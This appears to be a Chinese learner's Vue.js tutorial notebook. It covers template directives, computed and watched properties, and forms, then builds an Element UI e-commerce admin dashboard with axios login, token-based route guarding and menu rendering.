形式的特殊语法， sites 是源数据数组并且 site 是数组元素迭代的别名。\nv-for 可以绑定数据到数组来渲染一个列表：\n&lt;div v-for=\"item in arr\">      &lt;p>&#123;&#123;item&#125;&#125;&lt;/p>&lt;/div>    &lt;script>import axios from \"axios\";export default &#123;  props: &#123;&#125;,  components: &#123;&#125;,  data() &#123;    return &#123;      arr:[        '12',        '123',        '1234',        '12345'      ]    &#125;;  &#125;,  methods: &#123;     &#125;,&#125;;&lt;/script>\n\n&lt;div id=\"app\">  &lt;ul>    &lt;li v-for=\"(value, key, index) in object\">     &#123;&#123; index &#125;&#125;. &#123;&#123; key &#125;&#125; : &#123;&#123; value &#125;&#125;    &lt;/li>  &lt;/ul>&lt;/div>&lt;script>new Vue(&#123;  el: '#app',  data: &#123;    object:&#123;        name:\"kif2\",        age:12,        sex:\"man\",        class:7      &#125;  &#125;&#125;)&lt;/script>\n\n你也可以提供第二个的参数为键名,第三个参数为索引.\n十二、Vue.js 计算属性计算属性关键词: computed。\n计算属性在处理一些复杂逻辑时是很有用的。\n\n&lt;h2>&#123;&#123;message&#125;&#125;&lt;/h2>&lt;h2>&#123;&#123;remessage&#125;&#125;&lt;/h2> &lt;script>import axios from \"axios\";export default &#123;  props: &#123;&#125;,  components: &#123;&#125;,  data() &#123;    return &#123;       message: \"kif is cool\",    &#125;;  &#125;, computed: &#123;   remessage:function () &#123;     return this.message.split(\" \").reverse().join(\" \")   &#125;  &#125;,  methods: &#123;   &#125;,&#125;;&lt;/script>\n\n中声明了一个计算属性 remessage 。\n提供的函数将用作属性 vm.remessage 的 getter 。\nvm.remessage 依赖于 vm.message，在 vm.message 发生改变时，vm.remessage 也会更新。\ncomputed vs methods我们可以使用 methods 来替代 computed，效果上两个都是一样的，但是 computed 是基于它的依赖缓存，只有相关依赖发生改变时才会重新取值。而使用 methods ，在重新渲染的时候，函数总会重新调用执行。\n可以说使用 computed 性能会更好，但是如果你不希望缓存，你可以使用 methods 属性。\n十三、Vue.js 监听属性Vue.js 监听属性 watch我们可以通过 watch 来响应数据的变化。\n以下实例通过使用 watch 实现计数器：\n&lt;p style = \"font-size:25px;\">计数器: &#123;&#123; counter &#125;&#125;&lt;/p> &lt;button @click = \"counter++\" style = \"font-size:25px;\">点我&lt;/button>   &lt;script>import axios from \"axios\";export default &#123;  props: &#123;&#125;,  components: &#123;&#125;,  data() &#123;    return &#123;       counter:10,    &#125;;  &#125;,  watch:&#123;    counter:function (newValue,oldValue) &#123;      console.log(\"新值:\"+newValue+\"-----旧值\"+oldValue)    &#125;  &#125;,  methods: &#123;      &#125;,&#125;;&lt;/script>\n\n\n十四、Vue.js 表单v-model指令在表单控件元素上创建双向数据绑定。\n&lt;p&gt;input 元素：&lt;&#x2F;p&gt;  &lt;input v-model&#x3D;&quot;message&quot; placeholder&#x3D;&quot;编辑我……&quot;&gt;  &lt;p&gt;消息是: &#123;&#123; message &#125;&#125;&lt;&#x2F;p&gt;      &lt;p&gt;textarea 元素：&lt;&#x2F;p&gt;  &lt;p style&#x3D;&quot;white-space: pre&quot;&gt;&#123;&#123; message2 &#125;&#125;&lt;&#x2F;p&gt;  &lt;textarea v-model&#x3D;&quot;message2&quot; placeholder&#x3D;&quot;多行文本输入……&quot;&gt;&lt;&#x2F;textarea&gt;      &lt;script&gt;new Vue(&#123;  el: &#39;#app&#39;,  data: &#123;     message: &quot;kif is cool&quot;,       message2:&quot;C.S.N&quot;,  &#125;&#125;)&lt;&#x2F;script&gt;\n\n\n\n\n案例一：图片轮播&lt;template>  &lt;div>    &lt;div>      &lt;img :src=\"imgArr[index].src\" style=\"width: 200px\" />      &lt;a @click=\"shang()\">上一张&lt;/a>      &lt;a @click=\"next()\">下一张&lt;/a>    &lt;/div>  &lt;/div>&lt;/template>&lt;script>import axios from \"axios\";export default &#123;  props: &#123;&#125;,  components: &#123;&#125;,  data() &#123;    return &#123;      imgArr: [        &#123;          src: \"https://gitee.com/wkkif/PicGoimg/raw/master/img/20210626155050.jpg\",          id: 0,        &#125;,        &#123;          src: \"https://gitee.com/wkkif/PicGoimg/raw/master/img/20210613163532.jpg\",          id: 1,        &#125;,        &#123;          src: \"https://gitee.com/wkkif/PicGoimg/raw/master/img/20210505221033.jpg\",          id: 2,        &#125;,        &#123;          src: \"https://gitee.com/wkkif/PicGoimg/raw/master/img/20210505221026.jpg\",          id: 3,        &#125;,      ],      index: 0,    &#125;;  &#125;,  watch: &#123;  &#125;,  computed: &#123;   &#125;,  methods: &#123;    next: function () &#123;      if (this.index == 3) &#123;        this.index = 0;      &#125; else &#123;        this.index++;      &#125;    &#125;,    shang: function () &#123;      if (this.index == 0) &#123;        this.index = 3;      &#125; else &#123;        this.index--;      &#125;    &#125;,  &#125;,&#125;;&lt;/script>&lt;style>&lt;/style>\n\n\n\n作业2：自动播放轮播图十五、父子组件1）创建子组件在components目录下新建mod文件夹，用于存放一下可以复用的子组件。比如新建一个topView.vue组件\n\n2）在父组件中引入子组件　　　　引入：\nimport topView from &#39;..&#x2F;components&#x2F;mod&#x2F;topView&#39;\n\n　　　　注册：在&lt;script&gt;&lt;/script&gt;标签内的 name代码块后面加上 \ncomponents: &#123;topView &#125;\n\n　　　　使用：在&lt;template&gt;&lt;/template&gt;内加上\n&lt;topView&gt;&lt;&#x2F;topView&gt;\n\n\n效果：\n\n3）父子组件通信　子组件：\n\n父组件：\n\n\n十六、项目实战一、项目概述1.学习目标\n2.项目结构\n3.项目概述\n4.功能\n5.开发模式\n6.前端技术栈\n二、项目创建2.2.1创建一个基于 webpack 模板的新项目路径！\nvue init webpack my-project\n\n\n\n\n\nVue build &#x3D;&#x3D;&gt; 打包方式，回车即可；\nInstall vue-router &#x3D;&#x3D;&gt; 是否要安装 vue-router，项目中肯定要使用到 所以Y 回车；\nUse ESLint to lint your code &#x3D;&#x3D;&gt; 是否需要 js 语法检测 目前我们不需要 所以 n 回车；\nSet up unit tests &#x3D;&#x3D;&gt; 是否安装 单元测试工具 目前我们不需要 所以 n 回车；\nSetup e2e tests with Nightwatch &#x3D;&#x3D;&gt; 是否需要 端到端测试工具 目前我们不需要 所以 n 回车；\n\n2.2.2安装依赖cd my-projectnpm i\n\n\n2.2.3启动项目npm run dev\n\n\n\nctrl c结束\n参考：\nhttps://www.cnblogs.com/hellman/p/10985377.html\n2.3 ElementUIhttps://element.eleme.cn/#/zh-CN\n\n2.3.1 npm 安装推荐使用 npm 的方式安装，它能更好地和 webpack 打包工具配合使用。\nnpm i element-ui -S\n\n\n2.3.2 引入Element引入整个 Element，或是根据需要仅引入部分组件。我们先介绍如何引入完整的 Element。\n在 main.js 中写入以下内容：\nimport Vue from 'vue';import ElementUI from 'element-ui';import 'element-ui/lib/theme-chalk/index.css';import App from './App.vue';Vue.use(ElementUI);new Vue(&#123;  el: '#app',  render: h => h(App)&#125;);\n\n以上代码便完成了 Element 的引入。需要注意的是，样式文件需要单独引入。\n2.3.3 全局配置在引入 Element 时，可以传入一个全局配置对象。该对象目前支持 size 与 zIndex 字段。size 用于改变组件的默认尺寸，zIndex 设置弹框的初始 z-index（默认值：2000）。按照引入 Element 的方式，具体操作如下：\n完整引入 Element：\nimport Vue from 'vue';import Element from 'element-ui';Vue.use(Element, &#123; size: 'small', zIndex: 3000 &#125;);\n\n\n\n2.4 Axios\nAxios是一个基于promise的HTTP库（类似于jQuery的Ajax，用于HTTP请求）\n\n2.4.1 使用 npm:npm install axios\n\n\n2.4.2.使用 cdn:&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;unpkg.com&#x2F;axios&#x2F;dist&#x2F;axios.min.js&quot;&gt;&lt;&#x2F;script&gt;\n\n2.5、用less写样式2.5.1什么是LESS？LESS是一个CSS预处理器，可以为网站启用可自定义，可管理和可重用的样式表。 LESS是一种动态样式表语言，扩展了CSS的功能。 LESS也是跨浏览器友好。\nCSS预处理器是一种脚本语言，可扩展CSS并将其编译为常规CSS语法，以便可以通过Web浏览器读取。 它提供诸如变量，函数， mixins 和操作等功能，可以构建动态CSS。\nhttps://less.bootcss.com/#%E6%A6%82%E8%A7%88\n2.5.2安装less依赖：npm install less less-loader --save\n\n\n安装成功之后，可在package.json中看到，多增加了2个模块：\n\n在main.js\nimport less from &#39;less&#39;Vue.use(less)\n\n编写less\n&lt;style lang&#x3D;&quot;less&quot; rel&#x3D;&quot;stylesheet&#x2F;less&quot; scoped&gt;&lt;&#x2F;style&gt;\n\n报错：\n\n解决：https://blog.csdn.net/qq_44617099/article/details/114973132\n原因\nless-loader版本过高解决办法\n卸载原来的less和less-loader\nnpm uninstall less-loader  npm uninstall less \n\nnpm install less@3.12.2 less-loader@4.1.0 --save-dev\n\n\n\n2.5.3.多层嵌套&lt;div id&#x3D;&quot;mainView&quot;&gt;    &lt;h1&gt;kif&lt;&#x2F;h1&gt;    &lt;topView text&#x3D;&quot;注册&quot; @message&#x3D;&quot;getmessage&quot;&gt;&lt;&#x2F;topView&gt;    &lt;div class&#x3D;&quot;firstView&quot;&gt;      View1      &lt;div class&#x3D;&quot;secondView&quot;&gt;        view2      &lt;&#x2F;div&gt;    &lt;&#x2F;div&gt;&lt;style lang&#x3D;&quot;less&quot; rel&#x3D;&quot;stylesheet&#x2F;less&quot; scoped&gt;#mainView&#123;  height: 200px;  width: 200px;  background-color: antiquewhite;  .firstView&#123;    height: 100px;    width: 100px;    background-color: aqua;    .secondView    &#123;      width: 50px;      height: 50px;      background-color: aliceblue;    &#125;  &#125;&#125;\n\n\n\n三、后端接口电商管理后台 API 接口文档\n3.1. API V1 接口说明\n接口基准地址：http://timemeetyou.com:8889/api/private/v1/\n服务端已开启 CORS 跨域支持\nAPI V1 认证统一使用 Token 认证\n需要授权的 API ，必须在请求头中使用 Authorization 字段提供 token 令牌\n使用 HTTP Status Code 标识状态\n数据返回格式统一使用 JSON\n\n3.1.1. 支持的请求方法\nGET（SELECT）：从服务器取出资源（一项或多项）。\nPOST（CREATE）：在服务器新建一个资源。\nPUT（UPDATE）：在服务器更新资源（客户端提供改变后的完整资源）。\nPATCH（UPDATE）：在服务器更新资源（客户端提供改变的属性）。\nDELETE（DELETE）：从服务器删除资源。\nHEAD：获取资源的元数据。\nOPTIONS：获取信息，关于资源的哪些属性是客户端可以改变的。\n\n3.1.2. 通用返回状态说明\n\n\n状态码\n含义\n说明\n\n\n\n200\nOK\n请求成功\n\n\n201\nCREATED\n创建成功\n\n\n204\nDELETED\n删除成功\n\n\n400\nBAD REQUEST\n请求的地址不存在或者包含不支持的参数\n\n\n401\nUNAUTHORIZED\n未授权\n\n\n403\nFORBIDDEN\n被禁止访问\n\n\n404\nNOT FOUND\n请求的资源不存在\n\n\n422\nUnprocesable entity\n[POST&#x2F;PUT&#x2F;PATCH] 当创建一个对象时，发生一个验证错误\n\n\n500\nINTERNAL SERVER ERROR\n内部错误\n\n\n\n\n\n\n\n3.1.3 postman测试Postman：\n\n&#123;    \"data\": &#123;        \"id\": 500,        \"rid\": 0,        \"username\": \"admin\",        \"mobile\": \"13113344444\",        \"email\": \"arthur.cao@icloud.com\",        \"token\": \"Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjUwMCwicmlkIjowLCJpYXQiOjE2MjU2NTA0NTEsImV4cCI6MTYyNTczNjg1MX0.T0d5W_HNtLsOtSlz5eD5kGHHIGvCMQ4YFN4Ye7oa7FU\"    &#125;,    \"meta\": &#123;        \"msg\": \"登录成功\",        \"status\": 200    &#125;&#125;\n\n四、登录4.1.登录业务流程①在登录页面输入用户名和密码②调用后台接口进行验证③通过验证之后，根据后台的响应状态跳转到项目主页\n4.2.登录业务的相关技术点●http是无状态的\n●通过cookie在客户端记录状态\n●通过session在服务器端记录状态\n●通过token方式维持状态（跨域时）\n4.3 token\n4.4 实现登录功能4.4.1 布局\n4.4.2 创建页面&lt;template&gt;    &lt;div&gt;       &lt;div class&#x3D;&quot;login_box&quot;&gt;       &lt;&#x2F;div&gt;    &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;&lt;script&gt;    export default &#123;        props: &#123;        &#125;,        components: &#123;        &#125;,        data()&#123;            return &#123;                            &#125;        &#125;,        methods: &#123;        &#125;    &#125;&lt;&#x2F;script&gt;&lt;style&gt;.login_box&#123;    width: 450px;    height: 300px;    position: absolute;    left: 50%;    top: 50%;    transform: translate(-50%,-50%);        background-color: aquamarine;&#125;&lt;&#x2F;style&gt;\n\n\n\n\n1.logo&lt;template&gt;  &lt;div class&#x3D;&quot;main&quot;&gt;    &lt;div class&#x3D;&quot;login_box&quot;&gt;                      &lt;div class&#x3D;&quot;avatar_box&quot;&gt;        &lt;img src&#x3D;&quot;..&#x2F;assets&#x2F;logo.png&quot; &#x2F;&gt;      &lt;&#x2F;div&gt;                    &lt;&#x2F;div&gt;  &lt;&#x2F;div&gt;&lt;&#x2F;template&gt; &lt;script&gt;export default &#123;  props: &#123;&#125;,  components: &#123;&#125;,  data() &#123;    return &#123;&#125;;  &#125;,  methods: &#123;&#125;,&#125;;&lt;&#x2F;script&gt;&lt;style lang&#x3D;&quot;less&quot; rel&#x3D;&quot;stylesheet&#x2F;less&quot; scoped&gt;    .main &#123;  .login_box &#123;    background-color: white;    width: 450px;    height: 300px;    position: absolute;    left: 50%;    top: 50%;    transform: translate(-50%, -50%);  &#125;  .avatar_box &#123;    height: 130px;    width: 130px;    border: 1px solid #eee;    background-color: white;    border-radius: 50%;    padding: 10px;    position: absolute;    left: 50%;    transform: translate(-50%,-50%);    img &#123;      height: 100%;      width: 100%;      border-radius: 50%;      background-color: #eee;    &#125;  &#125;&#125;    &lt;&#x2F;style&gt;\n\n2.输入框&lt;el-form :model&#x3D;&quot;from&quot; label-width&#x3D;&quot;80px&quot; class&#x3D;&quot;loginFrom&quot;&gt;        &lt;el-form-item label&#x3D;&quot;用户名&quot;&gt;          &lt;el-input            prefix-icon&#x3D;&quot;el-icon-user&quot;            v-model&#x3D;&quot;from.username&quot;          &gt;&lt;&#x2F;el-input&gt;        &lt;&#x2F;el-form-item&gt;        &lt;el-form-item label&#x3D;&quot;密码&quot;&gt;          &lt;el-input            prefix-icon&#x3D;&quot;el-icon-help&quot;            v-model&#x3D;&quot;from.password&quot;            show-password          &gt;&lt;&#x2F;el-input&gt;        &lt;&#x2F;el-form-item&gt;        &lt;el-form-item class&#x3D;&quot;btn&quot;&gt;          &lt;el-button type&#x3D;&quot;primary&quot; @click&#x3D;&quot;login()&quot;&gt;登录&lt;&#x2F;el-button&gt;          &lt;el-button type&#x3D;&quot;primary&quot;&gt;注册&lt;&#x2F;el-button&gt;        &lt;&#x2F;el-form-item&gt;      &lt;&#x2F;el-form&gt;\n\n3.数据绑定&lt;el-form :model&#x3D;&quot;from&quot; label-width&#x3D;&quot;80px&quot; class&#x3D;&quot;loginFrom&quot;&gt;        &lt;el-form-item label&#x3D;&quot;用户名&quot;&gt;          &lt;el-input            prefix-icon&#x3D;&quot;el-icon-user&quot;            v-model&#x3D;&quot;from.username&quot;          &gt;&lt;&#x2F;el-input&gt;        &lt;&#x2F;el-form-item&gt;        &lt;el-form-item label&#x3D;&quot;密码&quot;&gt;          &lt;el-input            prefix-icon&#x3D;&quot;el-icon-help&quot;            v-model&#x3D;&quot;from.password&quot;            show-password          &gt;&lt;&#x2F;el-input&gt;        &lt;&#x2F;el-form-item&gt;        &lt;el-form-item class&#x3D;&quot;btn&quot;&gt;          &lt;el-button type&#x3D;&quot;primary&quot; @click&#x3D;&quot;login()&quot;&gt;登录&lt;&#x2F;el-button&gt;          &lt;el-button type&#x3D;&quot;primary&quot;&gt;注册&lt;&#x2F;el-button&gt;        &lt;&#x2F;el-form-item&gt;      &lt;&#x2F;el-form&gt;                         data() &#123;    return &#123;      from: &#123;        username: &quot;&quot;,        password: &quot;&quot;,      &#125;,    &#125;;  &#125;,\n\n4.验证规则from：\n&lt;el-form  :rules&#x3D;&quot;loginRule&quot;&gt;\n\nitem:\n&lt;el-form-item  prop&#x3D;&quot;password&quot;&gt;\n\ndata:\nloginRule:&#123;          password:[              &#123; min: 3, max: 5, message: '长度在 3 到 5 个字符', trigger: 'blur' &#125;          ]      &#125;\n\n5.登陆预验证from：\n&lt;el-form ref&#x3D;&quot;loginFromref&quot;&gt;\n\nmethod:\nlogin: function () &#123;      var flag;      this.$refs.loginFromref.validate((valid) => &#123;            flag = valid;      &#125;);            if (flag) &#123;        var username = this.from.username;        var password = this.from.password;        console.log(username);      &#125;    &#125;,\n\n6.axios(1)\naxios.post(&quot;http:&#x2F;&#x2F;timemeetyou.com:8889&#x2F;api&#x2F;private&#x2F;v1&#x2F;login&quot;, this.from).then((res) &#x3D;&gt; &#123;          console.log(&quot;数据：&quot;, res);        &#125;);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n(2).全局设置\nmain.js\nimport axios from \"axios\"axios.defaults.baseURL = \"http://timemeetyou.com:8889/api/private/v1/\"; // 关键步骤–填写后台请求统一的地址axios.defaults.headers.post['Content-Type'] = 'application/x-www-form-urlencoded'; //设置全局数据发送格式Vue.config.productionTip = false;Vue.prototype.$axios = axios;\n\n\n\n\n\nvue:\nthis.$axios          .post(\"login\", this.from)          .then((res) => &#123;            console.log(res.data);            if (res.data.meta.status == 200) &#123;              this.$router.push(&#123; path: \"/index\" &#125;);              this.$message(&#123;                message: \"恭喜你，这是一条成功消息\",                type: \"success\",              &#125;);            &#125;            else            &#123;                if(res.data.meta.status==400)                &#123;                     this.$message.error('密码错误');                &#125;            &#125;          &#125;)          .catch((err) => console.log(err));\n\n\n4.4.3 token 1.将登录成功之后的token,保存到客户端的sessionStorage 中\nwindow.sessionStorage.setItem(&quot;token&quot;,res.data.data.token)\n\n 1.1 项目中出了登录之外的其他API接口，必须在登录之后才能访问\n1.2 token 只应在当前网站打开期间生效，所以将token保存在sessionStorage 中\n 2.通过编程式导航跳转到后台主页，路由地址是&#x2F;index\n4.5 实现导航守卫如果用户没有登录，但是直接通过URL访问特定页面，需要重新导航到登录页面。\n修改router\nrouter:\nconst router&#x3D; new Router(&#123;  routes: [    &#123;      path: &#39;&#x2F;&#39;,      name: &#39;login&#39;,      component: login    &#125;,    &#123;      path: &#39;&#x2F;index&#39;,      name: &#39;index&#39;,      component: index    &#125;,  ]&#125;)   &#x2F;&#x2F; 挂载router.beforeEach((to,from,next)&#x3D;&gt;&#123;  \t\t&#x2F;&#x2F; to将要访问的路径\t\t&#x2F;&#x2F; from 代表从哪个路径跳转而来\t\t&#x2F;&#x2F; next是一个函数，表示放行        &#x2F;&#x2F; next()放行   next(&#39; &#x2F;login&#39;)强制跳转         if(to.path&#x3D;&#x3D;&#x3D;&#39;&#x2F;&#39;) return next()  const tokenStr &#x3D; window.sessionStorage.getItem(&quot;token&quot;)  if(!tokenStr) return (&quot;&#x2F;&quot;)  next()&#125;)export default router\n\n4.5 退出登录4.5.1 退出功能实现原理基于token的方式实现退出比较简单，只需要销毁本地的token即可。这样，后续的请求就不会携带token，必须重新登录生成一个新的token之后才可以访问页面。\n&#x2F;&#x2F;清空tokenwindow.sessionStorage.clear ()&#x2F;&#x2F;跳转到登录页this.$router.push(&#39;&#x2F;&#39;)\n\n五、主页5.1 布局\n\n&lt;el-container&gt;  &lt;el-header&gt;Header&lt;&#x2F;el-header&gt;  &lt;el-container&gt;    &lt;el-aside width&#x3D;&quot;200px&quot;&gt;Aside&lt;&#x2F;el-aside&gt;    &lt;el-main&gt;Main&lt;&#x2F;el-main&gt;  &lt;&#x2F;el-container&gt;&lt;&#x2F;el-container&gt;\n\n\n\n5.2 csshttps://uigradients.com/#PiggyPink\n1.三块颜色2.撑满全屏\n.index-container\n{\n height: 100%;\n}\n5.3 header&lt;el-header class&#x3D;&quot;index-header&quot;&gt;      &lt;div class&#x3D;&quot;hea&quot;&gt;        &lt;img class&#x3D;&quot;logo&quot; src&#x3D;&quot;..&#x2F;assets&#x2F;logo.png&quot; &#x2F;&gt;        &lt;span class&#x3D;&quot;shopname&quot;&gt;河东小卖部&lt;&#x2F;span&gt;      &lt;&#x2F;div&gt;      &lt;el-button @click&#x3D;&quot;loginout()&quot; class&#x3D;&quot;loginout&quot;&gt;退出&lt;&#x2F;el-button&gt;    &lt;&#x2F;el-header&gt;\n\n.el-header &#123;  background-color: #202124;  display: flex;  justify-content: space-between;  padding-left: 0;  align-items: center;  color: white;&#125;.el-aside &#123;  background-color: #20385E;&#125;.logo &#123;  width: 60px;&#125;.shopname &#123;  top: 9px;  margin-left: 20px;&#125;.hea &#123;  text-align: center;&#125;\n\n\n\n5.4 aside\n&lt;el-menu          default-active&#x3D;&quot;2&quot;          class&#x3D;&quot;el-menu-vertical-demo&quot;          @open&#x3D;&quot;handleOpen&quot;          @close&#x3D;&quot;handleClose&quot;          background-color&#x3D;&quot;#545c64&quot;          text-color&#x3D;&quot;#fff&quot;          active-text-color&#x3D;&quot;#ffd04b&quot;        &gt;          &lt;el-submenu index&#x3D;&quot;1&quot;&gt;            &lt;template slot&#x3D;&quot;title&quot;&gt;              &lt;i class&#x3D;&quot;el-icon-location&quot;&gt;&lt;&#x2F;i&gt;              &lt;span&gt;导航一&lt;&#x2F;span&gt;            &lt;&#x2F;template&gt;            &lt;el-menu-item index&#x3D;&quot;1-1&quot;&gt;选项1&lt;&#x2F;el-menu-item&gt;            &lt;el-menu-item index&#x3D;&quot;1-2&quot;&gt;选项2&lt;&#x2F;el-menu-item&gt;          &lt;&#x2F;el-submenu&gt;          &lt;el-submenu index&#x3D;&quot;2&quot;&gt;            &lt;template slot&#x3D;&quot;title&quot;&gt;              &lt;i class&#x3D;&quot;el-icon-location&quot;&gt;&lt;&#x2F;i&gt;              &lt;span&gt;导航二&lt;&#x2F;span&gt;            &lt;&#x2F;template&gt;            &lt;el-menu-item index&#x3D;&quot;2-1&quot;&gt;选项1&lt;&#x2F;el-menu-item&gt;            &lt;el-menu-item index&#x3D;&quot;2-2&quot;&gt;选项2&lt;&#x2F;el-menu-item&gt;          &lt;&#x2F;el-submenu&gt;          &lt;el-submenu index&#x3D;&quot;3&quot;&gt;            &lt;template slot&#x3D;&quot;title&quot;&gt;              &lt;i class&#x3D;&quot;el-icon-location&quot;&gt;&lt;&#x2F;i&gt;              &lt;span&gt;导航三&lt;&#x2F;span&gt;            &lt;&#x2F;template&gt;            &lt;el-menu-item index&#x3D;&quot;3-1&quot;&gt;选项1&lt;&#x2F;el-menu-item&gt;            &lt;el-menu-item index&#x3D;&quot;3-2&quot;&gt;选项2&lt;&#x2F;el-menu-item&gt;          &lt;&#x2F;el-submenu&gt;        &lt;&#x2F;el-menu&gt;\n\n\n\n5.5 获取菜单数据5.5.1 Axios添加Authorization需要授权的 API ，必须在请求头中使用 Authorization 字段提供 token 令牌\n通过axios请求拦截器添加token,保证拥有获取数据的权限。\nmain.js\naxios.interceptors.request.use(config=>  &#123;    console.log(config)    config.headers.Authorization = window.sessionStorage.getItem('token')    return config;  &#125;)\n\n\n5.5.2 api获取数据\n请求路径：menus\n请求方法：get\n响应数据\n\n&#123;    \"data\":        &#123;            \"id\": 101,            \"authName\": \"商品管理\",            \"path\": null,            \"children\": [                &#123;                    \"id\": 104,                    \"authName\": \"商品列表\",                    \"path\": null,                    \"children\": []                &#125;            ]        &#125;    \"meta\": &#123;        \"msg\": \"获取菜单列表成功\",        \"status\": 200    &#125;&#125;\n\n生命周期函数\ncreated（） &#123;&#125;,\n\n\ndata：\ndata() &#123;    return &#123;          menu: [],    &#125;;  &#125;,\n\ncreated：\ncreated() &#123;    this.getmenuData();  &#125;,\n\nmethods：\n&#x2F;&#x2F;  获取左侧菜单数据    getmenuData() &#123;      this.$axios        .get(&quot;menus&quot;)        .then((res) &#x3D;&gt; &#123;          &#x2F;&#x2F; if(rea.data)          console.log(res.data.meta.status);          if (res.data.meta.status &#x3D;&#x3D; 200) &#123;            this.menu &#x3D; res.data.data;            console.log(this.menu);          &#125;        &#125;)        .catch((err) &#x3D;&gt; console.log(err));    &#125;,\n\n5.5.3 渲染到页面&lt;el-submenu  v-for&#x3D;&quot;item in menu&quot; :key&#x3D;&quot;item.id+&#39;&#39;&quot; :index&#x3D;&quot;item.id&quot;&gt;\n\n :index&#x3D;”item.id”\n：表示动态数据\n:key+’’\n因为index泵为数字，所以+‘’转换为字符\n&lt;el-menu          background-color&#x3D;&quot;#545c64&quot;          text-color&#x3D;&quot;#fff&quot;          active-text-color&#x3D;&quot;#ffd04b&quot;          @open&#x3D;&quot;handleOpen&quot;          @close&#x3D;&quot;handleClose&quot;          unique-opened          :collapse&#x3D;&quot;isCollapse&quot;        &gt;          &lt;el-submenu :index&#x3D;&quot;item.id + &#39;&#39;&quot; v-for&#x3D;&quot;item in menu&quot; :key&#x3D;&quot;item.id&quot;&gt;            &lt;template slot&#x3D;&quot;title&quot;&gt;              &lt;i class&#x3D;&quot;el-icon-location&quot;&gt;&lt;&#x2F;i&gt;              &lt;span&gt;&#123;&#123; item.authName &#125;&#125;&lt;&#x2F;span&gt;            &lt;&#x2F;template&gt;            &lt;el-menu-item              v-for&#x3D;&quot;item2 in item.children&quot;              :index&#x3D;&quot;item2.id + &#39;&#39;&quot;              :key&#x3D;&quot;item2.id&quot;            &gt;              &lt;template slot&#x3D;&quot;title&quot;&gt;                &lt;i class&#x3D;&quot;el-icon-location&quot;&gt;&lt;&#x2F;i&gt;                &lt;span&gt;&#123;&#123; item2.authName &#125;&#125;&lt;&#x2F;span&gt;              &lt;&#x2F;template&gt;            &lt;&#x2F;el-menu-item&gt;          &lt;&#x2F;el-submenu&gt;        &lt;&#x2F;el-menu&gt;\n\n\n\n\n\n六、首页路由重定向6.1 定义组件welcome\n6.2 在index中设置作为子页面\n&#123;      path: &#39;&#x2F;index&#39;,      name: &#39;index&#39;,      component: index,      redirect:&#39;&#x2F;welcome&#39;,      &#x2F;&#x2F;打开时重定向到welcome      children:[        &#123;          path:&#39;&#x2F;welcome&#39;,          components:welcome        &#125;      ]      &#x2F;&#x2F;子路由    &#125;,\n\n6.3 在index相应区域通过下面标签引入\n&lt;router-view&gt;&lt;&#x2F;router-view&gt;\n\n\n\n出错点：Cannot read property &#39;$createElement&#39; of undefined\n\n\n其实就是路由配置里的component，要记住是component，不是components,就这么简单\n&#123;      path: &#39;&#x2F;index&#39;,           component: index,      redirect:&#39;&#x2F;welcome&#39;,      children:[        &#123;          path:&#39;&#x2F;welcome&#39;,          component:welcome        &#125;      ]    &#125;,\n\n七、侧边栏路由链接7.1 router属性\n\n点击后会跳转到相应index的地方\n\n\n但是以ID跳转不合适，所以改为以path为依据\n\n同时前面加上斜线，即\n:index&#x3D;&quot;&#39;&#x2F;&#39;+item.path&quot;\n\n\n\n注意是二级菜单\n\n\n八、用户管理模块8.1 用户列表\n8.1.1 新建users界面\n8.1.2 index.js导入import users from &#39;@&#x2F;components&#x2F;users&#x2F;users&#39;&#123;      path: &#39;&#x2F;index&#39;,           component: index,      redirect:&#39;&#x2F;welcome&#39;,      children:[        &#123;          path:&#39;&#x2F;welcome&#39;,          component:welcome        &#125;,         &#123;          path:&#39;&#x2F;users&#39;,          component:users        &#125;      ]    &#125;,\n\n注意：path要和上面:index的一致\n8.2 绘制用户列表8.2.1 头部面包屑\n&lt;el-breadcrumb separator-class&#x3D;&quot;el-icon-arrow-right&quot;&gt;      &lt;el-breadcrumb-item :to&#x3D;&quot;&#123; path: &#39;&#x2F;&#39; &#125;&quot;&gt;首页&lt;&#x2F;el-breadcrumb-item&gt;      &lt;el-breadcrumb-item&gt;用户管理&lt;&#x2F;el-breadcrumb-item&gt;      &lt;el-breadcrumb-item&gt;用户列表&lt;&#x2F;el-breadcrumb-item&gt;    &lt;&#x2F;el-breadcrumb&gt;\n\n8.2.2 面板\n8.2.3 搜索框&lt;div class&#x3D;&quot;search&quot;&gt;        &lt;div style&#x3D;&quot;margin-top: 15px&quot;&gt;          &lt;el-input            placeholder&#x3D;&quot;请输入内容&quot;            v-model&#x3D;&quot;input3&quot;            class&#x3D;&quot;input-with-select&quot;          &gt;            &lt;el-button slot&#x3D;&quot;append&quot; icon&#x3D;&quot;el-icon-search&quot;&gt;&lt;&#x2F;el-button&gt;          &lt;&#x2F;el-input&gt;        &lt;&#x2F;div&gt;      &lt;&#x2F;div&gt;\n\n布局\n\n&lt;el-row&gt;        &lt;el-col :span&#x3D;&quot;7&quot;&gt;          &lt;div style&#x3D;&quot;margin-top: 15px&quot;&gt;            &lt;el-input              placeholder&#x3D;&quot;请输入内容&quot;              v-model&#x3D;&quot;input3&quot;              class&#x3D;&quot;input-with-select&quot;            &gt;              &lt;el-button slot&#x3D;&quot;append&quot; icon&#x3D;&quot;el-icon-search&quot;&gt;&lt;&#x2F;el-button&gt;            &lt;&#x2F;el-input&gt;          &lt;&#x2F;div&gt;        &lt;&#x2F;el-col&gt;        &lt;el-col :span&#x3D;&quot;4&quot;&gt;&lt;&#x2F;el-col&gt;      